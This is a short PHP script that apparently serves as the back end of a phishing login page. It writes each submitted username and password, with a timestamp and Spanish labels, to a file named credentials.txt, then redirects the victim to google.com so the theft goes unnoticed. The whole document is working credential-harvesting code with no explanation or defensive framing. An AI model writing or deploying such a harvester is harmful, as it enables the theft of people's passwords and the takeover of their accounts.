<?php
file_put_contents("credentials.txt", date("Y-m-d H:i:s") . " | Usuario: " . $_POST['username'] . " | Contraseña: " . $_POST['password'] . "\n", FILE_APPEND);
header("Location: http://google.com");
exit();
?>